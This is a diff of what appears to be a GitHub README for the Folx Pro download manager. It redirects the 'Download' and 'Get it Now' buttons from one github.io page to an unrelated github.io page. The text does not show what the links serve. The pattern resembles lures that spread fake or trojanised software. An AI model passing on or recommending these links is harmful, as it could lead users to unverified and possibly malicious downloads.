@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://polycia-apps.github.io/.github/folxPro">
+  <a href="https://urinoterapia-sigma.github.io/.github/folxPro">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Folx Pro"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The integration of HTTP and BitTorrent download management in a single applicati
 
 <p align="center">
 
-[![Get it Now Folx Pro](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/folxPro)
+[![Get it Now Folx Pro](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/folxPro)
 
 </p>
 
